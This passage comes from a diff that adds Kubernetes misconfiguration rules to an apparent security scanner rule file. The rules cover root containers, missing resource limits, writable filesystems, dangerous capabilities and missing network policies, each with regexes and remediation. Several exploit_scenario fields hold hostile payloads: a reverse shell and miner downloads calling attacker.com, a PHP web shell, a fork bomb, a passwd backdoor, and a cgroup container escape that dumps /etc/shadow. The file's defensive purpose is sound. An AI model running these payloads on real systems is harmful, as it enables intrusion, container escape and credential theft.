+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - DEVOPS-YAML-004
+  detection_layer: 1
+- rule_id: DEVOPS-YAML-006
+  title: Container Running as Root
+  description: 'Detects containers without runAsNonRoot or with explicit runAsUser: 0, indicating the container process runs as the root user (UID 0). Running as root inside containers significantly increases
+    the blast radius of a container compromise, as the root user can modify system files, install packages, and exploit kernel vulnerabilities more easily.
+
+    '
+  language: yaml
+  category: devops
+  severity: Medium
+  confidence: 0.88
+  cwe: CWE-250
+  owasp: A05:2021-Security-Misconfiguration
+  tags:
+  - kubernetes
+  - root-container
+  - least-privilege
+  - cis-benchmark
+  - pss-restricted
+  - user-namespace
+  - container-hardening
+  patterns:
+  - type: regex
+    pattern: runAsUser\s*:\s*0
+  - type: regex
+    pattern: runAsNonRoot\s*:\s*false
+  - type: regex
+    pattern: USER\s+root
+  - type: regex
+    pattern: securityContext\s*:\s*\{[^}]*runAsUser\s*:\s*0[^}]*\}
+  - type: regex
+    pattern: securityContext\s*:\s*\n(?:\s+.*\n){0,20}?\s+runAsUser\s*:\s*0
+  - type: regex
+    pattern: runAsGroup\s*:\s*0
+  - type: regex
+    pattern: fsGroup\s*:\s*0
+  - type: regex
+    pattern: supplementalGroups\s*:\s*\[?\s*0
+  - type: regex
+    pattern: user\s*:\s*['"]?root['"]?
+  anti_patterns:
+  - 'runAsNonRoot: true'
+  - 'runAsUser: 1000'
+  - 'runAsUser: 65534'
+  - 'pod-security.kubernetes.io/enforce: restricted'
+  - constraints/K8sPSPAllowedUsers
+  - gatekeeper.sh/constraint
+  - kyverno.io/policy
+  - kube-bench
+  - calico.org/v3
+  - security.istio.io
+  - '# requires root for binding to port 80'
+  - initContainer
+  context_awareness:
+    surrounding_context_patterns:
+    - 'kind: Pod'
+    - 'kind: Deployment'
+    - 'kind: DaemonSet'
+    - 'kind: StatefulSet'
+    - 'securityContext:'
+    - 'containers:'
+    - 'podSecurityContext:'
+    - Dockerfile
+    taint_source_indicators:
+    - values.yaml
+    - '{{ .Values.securityContext'
+    - 'image:'
+    - FROM
+    - USER
+    taint_sink_indicators:
+    - 'runAsUser: 0'
+    - 'runAsNonRoot: false'
+    - USER root
+    - 'securityContext:'
+    sanitization_patterns:
+    - 'runAsNonRoot: true'
+    - 'runAsUser: 1000'
+    - 'runAsUser: 65534'
+    - USER nobody
+    - USER nonroot
+    - USER appuser
+    - pod-security.kubernetes.io/enforce
+    - seccomp profile
+  severity_scoring:
+    severity_weight: 6
+    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
+    exploitability_score: 0.7
+  exploit_scenario:
+    attack_example: 'Kernel Exploit from Root Container: An attacker who gains code execution (e.g., via RCE vulnerability) in a container running as root (UID 0) can exploit kernel vulnerabilities (e.g.,
+      DirtyPipe CVE-2022-0847, DirtyCow CVE-2016-5195) to escape the container. As root, they have the ability to load kernel modules (if capabilities allow), modify /proc/sys settings, and leverage the
+      full range of system calls that would be restricted for non-root users.
+
+      '
+    example_payload: '# Verify running as root in container
+
+      id
+
+      # uid=0(root) gid=0(root) groups=0(root)
+
+      # Install additional tools
+
+      apt-get update && apt-get install -y nmap netcat
+
+      # Attempt kernel exploit (e.g., DirtyPipe)
+
+      gcc -o exploit dirtypipe.c && ./exploit /etc/passwd
+
+      # Modify container filesystem
+
+      echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd
+
+      '
+    attacker_objective: 'Leverage root access within the container to exploit kernel vulnerabilities for container escape, modify system files for persistence, and install additional attack tools.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.9
+    context_match: 0.87
+    proximity_to_user_input: 0.25
+    sanitization_absence: 0.88
+  impact: 'Containers running as root can modify system files, install packages,
+
+    and exploit kernel vulnerabilities for container escapes. This violates
+
+    CIS Kubernetes Benchmark 5.2.6 and the Pod Security Standards
+
+    restricted profile.
+
+    '
+  remediation: "## Kubernetes Pod Security Standards\n- Set runAsNonRoot: true in securityContext\n- Set runAsUser to a non-zero UID (e.g., 1000 or 65534)\n- Apply the PSS restricted profile which requires\
+    \ runAsNonRoot\n\n## CIS Benchmark References\n- CIS Kubernetes Benchmark 5.2.6: Minimize the admission of root containers\n- CIS Docker Benchmark 4.1: Ensure a user for the container has been created\n\
+    \n## Helm Chart Hardening\n- Default values.yaml:\n  podSecurityContext:\n    runAsNonRoot: true\n    runAsUser: 1000\n    fsGroup: 1000\n  securityContext:\n    runAsNonRoot: true\n    runAsUser: 1000\n\
+    \n## OPA Rego Policy\n```rego\npackage kubernetes.admission\ndeny[msg] {\n  input.request.kind.kind == \"Pod\"\n  container := input.request.object.spec.containers[_]\n  container.securityContext.runAsUser\
+    \ == 0\n  msg := sprintf(\"Container %v must not run as root (UID 0)\", [container.name])\n}\ndeny[msg] {\n  input.request.kind.kind == \"Pod\"\n  not input.request.object.spec.securityContext.runAsNonRoot\n\
+    \  msg := \"Pod must set runAsNonRoot: true\"\n}\n```\n\n## Additional Remediation\n- Use distroless or minimal base images\n- Use USER directive in Dockerfiles\n- Use user namespaces for UID remapping\n\
+    - Set supplementalGroups and fsGroup to non-zero values\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/250.html
+  - https://kubernetes.io/docs/concepts/security/pod-security-standards/
+  - https://www.cisecurity.org/benchmark/kubernetes
+  - https://attack.mitre.org/techniques/T1611/
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: low
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: false
+    related_rules:
+    - DEVOPS-YAML-001
+    - DEVOPS-YAML-002
+    - DEVOPS-YAML-009
+    - DEVOPS-YAML-008
+  detection_layer: 1
+- rule_id: DEVOPS-YAML-007
+  title: Missing Resource Limits
+  description: 'Detects Kubernetes containers without CPU/memory resource limits, enabling resource exhaustion attacks. Without resource limits, a single container can consume all available node resources,
+    starving other workloads and potentially crashing the node. This is a common vector for denial-of-service attacks within shared Kubernetes clusters.
+
+    '
+  language: yaml
+  category: devops
+  severity: Medium
+  confidence: 0.82
+  cwe: CWE-770
+  owasp: A05:2021-Security-Misconfiguration
+  tags:
+  - kubernetes
+  - resource-limits
+  - denial-of-service
+  - resource-management
+  - cis-benchmark
+  - cluster-stability
+  - quality-of-service
+  patterns:
+  - type: regex
+    pattern: 'containers\s*:\s*\n\s+-\s+name\s*:'
+  - type: regex
+    pattern: 'image\s*:\s*\S+\s*\n(?:(?!\s+resources\s*:).){0,500}\n\s+(?:ports|env|volumeMounts)\s*:'
+  - type: regex
+    pattern: containers\s*:\s*\n\s+-\s+name\s*:\s*\S+\s*\n\s+image\s*:\s*\S+\s*\n(?:(?!\s+resources).){0,500}
+  - type: regex
+    pattern: resources\s*:\s*\{\s*\}
+  - type: regex
+    pattern: resources\s*:\s*\n\s+requests\s*:\s*\n(?:(?!\s+limits\s*:).){0,500}
+  - type: regex
+    pattern: initContainers\s*:\s*\n\s+-\s+name\s*:\s*\S+\s*\n\s+image\s*:\s*\S+\s*\n(?:(?!\s+resources).){0,500}
+  anti_patterns:
+  - 'resources:'
+  - 'limits:'
+  - 'requests:'
+  - LimitRange
+  - ResourceQuota
+  - pod-security.kubernetes.io/enforce
+  - constraints/K8sContainerLimits
+  - gatekeeper.sh/constraint
+  - kyverno.io/policy
+  - kube-bench
+  - calico.org/v3
+  - VPA
+  - VerticalPodAutoscaler
+  context_awareness:
+    surrounding_context_patterns:
+    - 'kind: Pod'
+    - 'kind: Deployment'
+    - 'kind: DaemonSet'
+    - 'kind: StatefulSet'
+    - 'kind: Job'
+    - 'kind: CronJob'
+    - 'containers:'
+    - 'initContainers:'
+    - 'spec:'
+    taint_source_indicators:
+    - values.yaml
+    - '{{ .Values.resources'
+    - 'image:'
+    - 'containers:'
+    taint_sink_indicators:
+    - 'containers:'
+    - 'initContainers:'
+    - 'image:'
+    - no resources block present
+    sanitization_patterns:
+    - 'resources:'
+    - 'limits:'
+    - 'requests:'
+    - LimitRange
+    - ResourceQuota
+    - VerticalPodAutoscaler
+    - HorizontalPodAutoscaler
+    - pod-security.kubernetes.io
+  severity_scoring:
+    severity_weight: 5
+    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
+    exploitability_score: 0.65
+  exploit_scenario:
+    attack_example: 'Resource Exhaustion DoS: An attacker who gains access to a container without resource limits (e.g., via RCE vulnerability) can launch a fork bomb or memory exhaustion attack that consumes
+      all CPU and memory on the node. This causes all other pods on the same node to be evicted or OOM-killed, resulting in denial of service for critical workloads including monitoring, logging, and service
+      mesh sidecars.
+
+      '
+    example_payload: "# Fork bomb inside unrestricted container\n:(){ :|:& };:\n# Memory exhaustion\npython3 -c \"x = [' ' * 10**6 for _ in range(10**6)]\"\n# CPU exhaustion via cryptomining\nwget -O xmrig\
+      \ https://attacker.com/xmrig && chmod +x xmrig && ./xmrig \\\n  --url=pool.attacker.com:3333 --user=wallet --threads=$(nproc)\n# Disk exhaustion (if no ephemeral storage limits)\ndd if=/dev/zero of=/tmp/fill\
+      \ bs=1M count=100000\n"
+    attacker_objective: 'Exhaust node CPU, memory, or disk resources to cause denial of service for co-located workloads, disrupt cluster operations, or deploy cryptominers on unrestricted compute resources.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.78
+    context_match: 0.85
+    proximity_to_user_input: 0.15
+    sanitization_absence: 0.82
+  impact: 'Containers without resource limits can consume all available CPU and
+
+    memory on a node, causing denial of service for other workloads.
+
+    This violates CIS Kubernetes Benchmark 5.4.3 and can result in
+
+    Kubernetes BestEffort QoS class assignment, making the pod the
+
+    first candidate for eviction under resource pressure.
+
+    '
+  remediation: "## Kubernetes Pod Security Standards\n- Set both requests and limits for CPU and memory on every container\n- Ensure Guaranteed QoS by setting requests equal to limits for critical workloads\n\
+    \n## CIS Benchmark References\n- CIS Kubernetes Benchmark 5.4.3: Apply Security Context to Your Pods and Containers\n- CIS Kubernetes Benchmark 5.2.8: Ensure resource limits are set\n\n## Helm Chart\
+    \ Hardening\n- Always define default resources in values.yaml:\n  resources:\n    requests:\n      cpu: 100m\n      memory: 128Mi\n    limits:\n      cpu: 500m\n      memory: 512Mi\n- Add resource validation\
+    \ in Helm chart tests\n\n## OPA Rego Policy\n```rego\npackage kubernetes.admission\ndeny[msg] {\n  input.request.kind.kind == \"Pod\"\n  container := input.request.object.spec.containers[_]\n  not container.resources.limits.memory\n\
+    \  msg := sprintf(\"Container %v must have memory limits\", [container.name])\n}\ndeny[msg] {\n  input.request.kind.kind == \"Pod\"\n  container := input.request.object.spec.containers[_]\n  not container.resources.limits.cpu\n\
+    \  msg := sprintf(\"Container %v must have CPU limits\", [container.name])\n}\n```\n\n## Additional Remediation\n- Apply LimitRange objects for namespace-level defaults\n- Use ResourceQuota for namespace-level\
+    \ totals\n- Monitor resource usage with Prometheus/Grafana\n- Use VerticalPodAutoscaler (VPA) for right-sizing\n- Set ephemeral-storage limits to prevent disk exhaustion\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/770.html
+  - https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/
+  - https://www.cisecurity.org/benchmark/kubernetes
+  - https://attack.mitre.org/techniques/T1499/
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+  cross_rule_intelligence:
+    cross_file_risk_flag: false
+    requires_ai_validation: true
+    high_impact_flag: false
+    related_rules:
+    - DEVOPS-YAML-006
+    - DEVOPS-YAML-008
+  detection_layer: 1
+- rule_id: DEVOPS-YAML-008
+  title: Writable Root Filesystem
+  description: 'Detects containers without readOnlyRootFilesystem set to true, or with it explicitly set to false, allowing filesystem modifications within the container. Writable root filesystems enable
+    attackers to modify application binaries, install backdoors, write web shells, tamper with configuration files, and establish persistence mechanisms within the container.
+
+    '
+  language: yaml
+  category: devops
+  severity: Medium
+  confidence: 0.84
+  cwe: CWE-284
+  owasp: A05:2021-Security-Misconfiguration
+  tags:
+  - kubernetes
+  - readonly-filesystem
+  - immutable-infrastructure
+  - cis-benchmark
+  - pss-restricted
+  - container-hardening
+  - defense-in-depth
+  patterns:
+  - type: regex
+    pattern: readOnlyRootFilesystem\s*:\s*false
+  - type: regex
+    pattern: securityContext\s*:\s*\{[^}]*readOnlyRootFilesystem\s*:\s*false[^}]*\}
+  - type: regex
+    pattern: securityContext\s*:\s*\n(?:(?!readOnlyRootFilesystem).){0,500}\n\s+(?:runAs|capabilities|allowPrivilege)
+  - type: regex
+    pattern: 'containers\s*:\s*\n\s+-\s+name\s*:\s*\S+\s*\n(?:(?!readOnlyRootFilesystem).){0,500}\n\s+(?:ports|env|volumeMounts|resources)\s*:'
+  - type: regex
+    pattern: securityContext\s*:\s*\n\s+runAsNonRoot.{0,500}\n(?:(?!readOnlyRootFilesystem).){0,500}
+  anti_patterns:
+  - 'readOnlyRootFilesystem: true'
+  - 'pod-security.kubernetes.io/enforce: restricted'
+  - constraints/K8sPSPReadOnlyRootFilesystem
+  - gatekeeper.sh/constraint
+  - kyverno.io/policy
+  - kube-bench
+  - calico.org/v3
+  - security.istio.io
+  - '# requires writable fs for'
+  - 'emptyDir:'
+  context_awareness:
+    surrounding_context_patterns:
+    - 'kind: Pod'
+    - 'kind: Deployment'
+    - 'kind: DaemonSet'
+    - 'kind: StatefulSet'
+    - 'securityContext:'
+    - 'containers:'
+    - 'volumeMounts:'
+    taint_source_indicators:
+    - values.yaml
+    - '{{ .Values.securityContext'
+    - 'image:'
+    - 'containers:'
+    taint_sink_indicators:
+    - 'readOnlyRootFilesystem: false'
+    - 'securityContext:'
+    - no readOnlyRootFilesystem set
+    - /tmp
+    - /var
+    sanitization_patterns:
+    - 'readOnlyRootFilesystem: true'
+    - 'emptyDir: {}'
+    - tmpfs
+    - pod-security.kubernetes.io/enforce
+    - 'volumeMounts:'
+    - ConfigMap
+  severity_scoring:
+    severity_weight: 5
+    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
+    exploitability_score: 0.6
+  exploit_scenario:
+    attack_example: 'Web Shell Persistence via Writable Filesystem: An attacker exploits a web application vulnerability (e.g., file upload RCE) in a container with a writable root filesystem. They write
+      a web shell to the application''s document root, modify the application binary to include a backdoor, or install a reverse shell that persists across container restarts (if the container is not recreated).
+      They can also modify /etc/resolv.conf to redirect DNS queries to an attacker-controlled server for data exfiltration.
+
+      '
+    example_payload: '# Write a web shell
+
+      echo ''<?php system($_GET["cmd"]); ?>'' > /var/www/html/shell.php
+
+      # Modify application binary for persistence
+
+      cp /bin/bash /usr/local/bin/app_backup
+
+      echo ''#!/bin/bash\nnc -e /bin/bash attacker.com 4444 &\nexec /usr/local/bin/app_backup "$@"'' > /usr/local/bin/app
+
+      # Tamper with DNS configuration
+
+      echo "nameserver 10.0.0.evil" > /etc/resolv.conf
+
+      # Install cryptominer in writable directory
+
+      curl -o /tmp/miner https://attacker.com/miner && chmod +x /tmp/miner
+
+      '
+    attacker_objective: 'Establish persistence within the container by modifying application binaries, writing web shells, or installing backdoors that survive process restarts. Tamper with system configuration
+      for DNS hijacking or credential theft.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.82
+    context_match: 0.85
+    proximity_to_user_input: 0.2
+    sanitization_absence: 0.84
+  impact: 'Writable root filesystems allow attackers to modify application binaries,
+
+    install backdoors, or write to system directories within the container.
+
+    This violates CIS Kubernetes Benchmark 5.2.7 and undermines immutable
+
+    infrastructure principles.
+
+    '
+  remediation: "## Kubernetes Pod Security Standards\n- Set readOnlyRootFilesystem: true in securityContext\n- The PSS restricted profile recommends (but does not require) this setting\n\n## CIS Benchmark\
+    \ References\n- CIS Kubernetes Benchmark 5.2.7: Minimize the admission of containers with writable root filesystems\n- CIS Docker Benchmark 5.12: Ensure the container's root filesystem is mounted as\
+    \ read only\n\n## Helm Chart Hardening\n- Default values.yaml:\n  securityContext:\n    readOnlyRootFilesystem: true\n- Define emptyDir volumes for writable paths:\n  volumeMounts:\n    - name: tmp\n\
+    \      mountPath: /tmp\n    - name: cache\n      mountPath: /var/cache\n  volumes:\n    - name: tmp\n      emptyDir: {}\n    - name: cache\n      emptyDir:\n        sizeLimit: 100Mi\n\n## OPA Rego Policy\n\
+    ```rego\npackage kubernetes.admission\ndeny[msg] {\n  input.request.kind.kind == \"Pod\"\n  container := input.request.object.spec.containers[_]\n  not container.securityContext.readOnlyRootFilesystem\n\
+    \  msg := sprintf(\"Container %v must have readOnlyRootFilesystem: true\", [container.name])\n}\ndeny[msg] {\n  input.request.kind.kind == \"Pod\"\n  container := input.request.object.spec.containers[_]\n\
+    \  container.securityContext.readOnlyRootFilesystem == false\n  msg := sprintf(\"Container %v has writable root filesystem\", [container.name])\n}\n```\n\n## Additional Remediation\n- Use emptyDir volumes\
+    \ for writable temporary directories\n- Use ConfigMaps and Secrets for configuration files\n- Use tmpfs mounts with size limits for temporary data\n- Build container images with all necessary files\
+    \ baked in at build time\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/284.html
+  - https://kubernetes.io/docs/concepts/security/pod-security-standards/
+  - https://www.cisecurity.org/benchmark/kubernetes
+  - https://attack.mitre.org/techniques/T1505/003/
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: false
+    related_rules:
+    - DEVOPS-YAML-001
+    - DEVOPS-YAML-006
+    - DEVOPS-YAML-009
+    - DEVOPS-YAML-004
+  detection_layer: 1
+- rule_id: DEVOPS-YAML-009
+  title: Dangerous Kubernetes Capabilities
+  description: 'Detects containers granted dangerous Linux capabilities such as SYS_ADMIN, SYS_PTRACE, NET_ADMIN, NET_RAW, SYS_MODULE, DAC_OVERRIDE, or ALL. These capabilities provide near-root privileges
+    and can be exploited for container escapes, network sniffing, kernel module loading, and bypassing file permission checks. The principle of least privilege requires dropping all capabilities and only
+    adding specific ones that are strictly necessary.
+
+    '
+  language: yaml
+  category: devops
+  severity: High
+  confidence: 0.93
+  cwe: CWE-250
+  owasp: A05:2021-Security-Misconfiguration
+  tags:
+  - kubernetes
+  - capabilities
+  - privilege-escalation
+  - cis-benchmark
+  - pss-restricted
+  - container-escape
+  - linux-capabilities
+  - least-privilege
+  patterns:
+  - type: regex
+    pattern: add\s*:\s*\n\s*-\s*(?:SYS_ADMIN|SYS_PTRACE|NET_ADMIN|NET_RAW|SYS_MODULE|DAC_OVERRIDE|ALL)
+  - type: regex
+    pattern: capabilities\s*:\s*\n\s+add\s*:\s*\n\s+-\s*ALL
+  - type: regex
+    pattern: add\s*:\s*\[\s*(?:SYS_ADMIN|ALL|NET_ADMIN|SYS_PTRACE)
+  - type: regex
+    pattern: add\s*:\s*\n\s*-\s*(?:SETUID|SETGID|CHOWN|FOWNER|FSETID|KILL|MKNOD|SYS_CHROOT)
+  - type: regex
+    pattern: add\s*:\s*\[\s*"?(?:SYS_ADMIN|ALL|NET_ADMIN|SYS_PTRACE|NET_RAW|SYS_MODULE|DAC_OVERRIDE|SETUID|SETGID)"?\s*\]
+  - type: regex
+    pattern: capabilities\s*:\s*\{[^}]*add\s*:\s*\[[^\]]*(?:SYS_ADMIN|ALL|NET_ADMIN|SYS_PTRACE)[^\]]*\][^}]*\}
+  - type: regex
+    pattern: add\s*:\s*\n(?:\s+-\s*\w+\n){3,}
+  - type: regex
+    pattern: securityContext\s*:\s*\n(?:\s+.*\n){0,20}?\s+capabilities\s*:\s*\n(?:\s+.*\n){0,20}?\s+add\s*:\s*\n\s+-\s*(?:SYS_ADMIN|ALL|NET_ADMIN)
+  anti_patterns:
+  - 'drop: ["ALL"]'
+  - 'drop:
+
+    .*ALL'
+  - "drop:\n            - ALL"
+  - "capabilities:\n            drop:\n              - ALL"
+  - 'pod-security.kubernetes.io/enforce: restricted'
+  - constraints/K8sPSPCapabilities
+  - gatekeeper.sh/constraint
+  - kyverno.io/policy
+  - kube-bench
+  - calico.org/v3
+  - security.istio.io
+  - '# required for debugging only'
+  - '# remove before production'
+  context_awareness:
+    surrounding_context_patterns:
+    - 'kind: Pod'
+    - 'kind: Deployment'
+    - 'kind: DaemonSet'
+    - 'kind: StatefulSet'
+    - 'securityContext:'
+    - 'capabilities:'
+    - 'containers:'
+    - 'add:'
+    - 'drop:'
+    taint_source_indicators:
+    - values.yaml
+    - '{{ .Values.securityContext'
+    - '{{ .Values.capabilities'
+    - 'capabilities:'
+    - 'add:'
+    taint_sink_indicators:
+    - 'add: [SYS_ADMIN]'
+    - 'add: [ALL]'
+    - 'add: [NET_ADMIN]'
+    - 'add: [SYS_PTRACE]'
+    - 'capabilities:'
+    sanitization_patterns:
+    - 'drop: ["ALL"]'
+    - "drop:\n              - ALL"
+    - "capabilities:\n            drop:\n              - ALL"
+    - pod-security.kubernetes.io/enforce
+    - PodSecurityPolicy
+    - Gatekeeper constraint
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
+    exploitability_score: 0.92
+  exploit_scenario:
+    attack_example: 'Container Escape via SYS_ADMIN Capability: An attacker in a container with CAP_SYS_ADMIN can abuse the capability to mount the host filesystem via cgroup escape (CVE-2022-0492), use
+      nsenter to enter the host namespace, or mount /dev/sda directly. With NET_ADMIN, they can reconfigure network interfaces, set up ARP spoofing for man-in-the-middle attacks, or redirect traffic. With
+      SYS_PTRACE, they can attach to processes in other containers sharing the same PID namespace and inject malicious code.
+
+      '
+    example_payload: '# SYS_ADMIN: cgroup escape technique
+
+      mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
+
+      mkdir /tmp/cgrp/x
+
+      echo 1 > /tmp/cgrp/x/notify_on_release
+
+      host_path=$(sed -n ''s/.*\perdir=\([^,]*\).*/\1/p'' /etc/mtab)
+
+      echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
+      echo ''#!/bin/bash'' > /cmd
+
+      echo "cat /etc/shadow > $host_path/shadow_dump" >> /cmd
+
+      chmod a+x /cmd
+
+      echo $$ > /tmp/cgrp/x/cgroup.procs
+
+      # NET_ADMIN: ARP spoofing
+
+      arp -s 10.0.0.1 aa:bb:cc:dd:ee:ff
+
+      iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443
+
+      # SYS_PTRACE: process injection
+
+      strace -p $(pgrep target_app) -e write
+
+      '
+    attacker_objective: 'Exploit Linux capabilities for container escape (SYS_ADMIN), network-level attacks and traffic interception (NET_ADMIN), process debugging and credential theft (SYS_PTRACE), or
+      kernel module loading for rootkit deployment (SYS_MODULE).
+
+      '
+  confidence_factors:
+    pattern_strength: 0.95
+    context_match: 0.93
+    proximity_to_user_input: 0.2
+    sanitization_absence: 0.93
+  impact: 'Capabilities like SYS_ADMIN, NET_ADMIN, and SYS_PTRACE provide near-root
+
+    privileges and can be exploited for container escapes. SYS_ADMIN alone
+
+    is essentially equivalent to full root privileges. This violates CIS
+
+    Kubernetes Benchmark 5.2.8 and 5.2.9, and the Pod Security Standards
+
+    restricted profile.
+
+    '
+  remediation: "## Kubernetes Pod Security Standards\n- Drop all capabilities by default: capabilities: { drop: [\"ALL\"] }\n- Add only specific needed capabilities (e.g., NET_BIND_SERVICE for port 80)\n\
+    - Apply the PSS restricted profile which only allows NET_BIND_SERVICE\n\n## CIS Benchmark References\n- CIS Kubernetes Benchmark 5.2.8: Minimize the admission of containers with added capabilities\n\
+    - CIS Kubernetes Benchmark 5.2.9: Minimize the admission of containers with capabilities assigned\n- CIS Docker Benchmark 5.3: Restrict Linux Kernel Capabilities within containers\n\n## Helm Chart Hardening\n\
+    - Default values.yaml:\n  securityContext:\n    capabilities:\n      drop:\n        - ALL\n      add: []  # Empty by default, override only when justified\n- Document justification for any added capabilities\
+    \ in chart README\n\n## OPA Rego Policy\n```rego\npackage kubernetes.admission\n\n# List of dangerous capabilities\ndangerous_caps := {\"SYS_ADMIN\", \"SYS_PTRACE\", \"NET_ADMIN\", \"NET_RAW\",\n  \
+    \                  \"SYS_MODULE\", \"DAC_OVERRIDE\", \"ALL\", \"SETUID\", \"SETGID\"}\n\ndeny[msg] {\n  input.request.kind.kind == \"Pod\"\n  container := input.request.object.spec.containers[_]\n \
+    \ cap := container.securityContext.capabilities.add[_]\n  dangerous_caps[cap]\n  msg := sprintf(\"Dangerous capability %v added to container %v\", [cap, container.name])\n}\n\ndeny[msg] {\n  input.request.kind.kind\
+    \ == \"Pod\"\n  container := input.request.object.spec.containers[_]\n  not container.securityContext.capabilities.drop\n  msg := sprintf(\"Container %v must drop ALL capabilities\", [container.name])\n\
+    }\n```\n\n## Additional Remediation\n- Use Pod Security Standards restricted profile\n- Audit capability usage with tools like kube-bench\n- Use seccomp profiles to further restrict system calls\n-\
+    \ Use AppArmor profiles for mandatory access control\n- Apply Calico network policies to restrict NET_RAW at the network level\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/250.html
+  - https://kubernetes.io/docs/concepts/security/pod-security-standards/
+  - https://www.cisecurity.org/benchmark/kubernetes
+  - https://man7.org/linux/man-pages/man7/capabilities.7.html
+  - https://attack.mitre.org/techniques/T1611/
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: low
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - DEVOPS-YAML-001
+    - DEVOPS-YAML-002
+    - DEVOPS-YAML-006
+    - DEVOPS-YAML-003
+  detection_layer: 1
+- rule_id: DEVOPS-YAML-010
+  title: Missing Network Policy
+  description: 'Detects Kubernetes namespaces and workloads without associated NetworkPolicy resources, allowing unrestricted pod-to-pod communication across the cluster. By default, Kubernetes does not
+    enforce any network segmentation, meaning every pod can communicate with every other pod. This flat network model enables lateral movement, data exfiltration, and cross-namespace attacks once an attacker
+    compromises a single pod.
+
+    '
+  language: yaml
+  category: devops
+  severity: High
+  confidence: 0.88
+  cwe: CWE-284
+  owasp: A05:2021-Security-Misconfiguration
+  tags:
+  - kubernetes
+  - network-policy
+  - network-segmentation
+  - lateral-movement
+  - zero-trust
+  - cis-benchmark
+  - microsegmentation
+  detection_layer: 1
+  attack_surface_type: network
+  patterns:
+  - type: regex
+    pattern: kind\s*:\s*Namespace\s*\n(?:(?!NetworkPolicy).){0,500}
+  - type: regex
+    pattern: kind\s*:\s*Deployment\s*\n(?:(?!NetworkPolicy).){0,500}
+  - type: regex
+    pattern: kind\s*:\s*(?:Deployment|StatefulSet|DaemonSet)\s*\n(?:[ \t]+.{0,500}\n){0,20}?\s+namespace\s*:\s*\S+\s*\n(?:(?!NetworkPolicy).){0,500}
+  - type: regex
+    pattern: apiVersion\s*:\s*apps/v1\s*\nkind\s*:\s*(?:Deployment|StatefulSet)\s*\n(?:(?!networking\.k8s\.io).){0,500}
+  - type: regex
+    pattern: spec\s*:\s*\n\s+podSelector\s*:\s*\{\s*\}\s*\n\s+policyTypes\s*:\s*\[\s*\]
+  anti_patterns:
+  - 'kind: NetworkPolicy'
+  - networking.k8s.io/v1
+  - calico.org/v3
+  - GlobalNetworkPolicy
+  - cilium.io/v2
+  - CiliumNetworkPolicy
+  - security.istio.io
+  - AuthorizationPolicy
+  - gatekeeper.sh/constraint
+  - kyverno.io/policy
+  bypass_variants:
+  - description: Empty network policy that allows all traffic
+    pattern: podSelector\s*:\s*\{\s*\}\s*\n\s+policyTypes\s*:\s*\[\s*\]
+  - description: Overly permissive ingress rule allowing all sources
+    pattern: ingress\s*:\s*\n\s+-\s*\{\s*\}
+  - description: Wildcard CIDR block allowing external traffic
+    pattern: cidr\s*:\s*0\.0\.0\.0/0
+  evasion_indicators:
+  - 'podSelector: {}'
+  - 'ingress: [{}]'
+  - 'egress: [{}]'
+  - 'cidr: 0.0.0.0/0'
+  encoding_variants:
+  - description: Helm template conditional bypassing network policy
+    pattern: '{{-\s*if\s+\.Values\.networkPolicy\.enabled\s*}}'
+  - description: Kustomize overlay removing network policy
+    pattern: \$patch\s*:\s*delete.*NetworkPolicy
+  multi_function_chain_patterns:
+  - description: Deployment without matching NetworkPolicy in same namespace
+    chain:
+    - kind\s*:\s*Deployment
+    - namespace\s*:\s*\S+
+    - no corresponding NetworkPolicy resource
+  privilege_context_flags:
+    requires_cluster_admin: false
+    requires_namespace_admin: true
+    network_exposure: unrestricted
+  business_logic_indicator:
+    data_sensitivity: high
+    compliance_relevant: true
+    regulatory_frameworks:
+    - PCI-DSS
+    - SOC2
+    - NIST-800-53
+  probable_taint_paths:
+  - source: Any compromised pod in the cluster
+    sink: All other pods via unrestricted network
+    propagation: Direct TCP/UDP communication across namespaces
+  impact: 'Without NetworkPolicies, all pods can communicate freely with every other
+
+    pod in the cluster, enabling lateral movement after an initial compromise.
+
+    An attacker who gains access to one pod can reach databases, internal APIs,
+
+    and control plane components. This violates CIS Kubernetes Benchmark 5.3.2
+
+    and zero-trust network principles.
+
+    '
+  remediation: "## Kubernetes Network Policies\n- Create default-deny NetworkPolicies for each namespace\n- Explicitly allow only required ingress and egress traffic\n- Apply namespace-level isolation as\
+    \ a baseline\n\n## Default Deny Policy Template\n```yaml\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-all\n  namespace: my-namespace\nspec:\n  podSelector:\
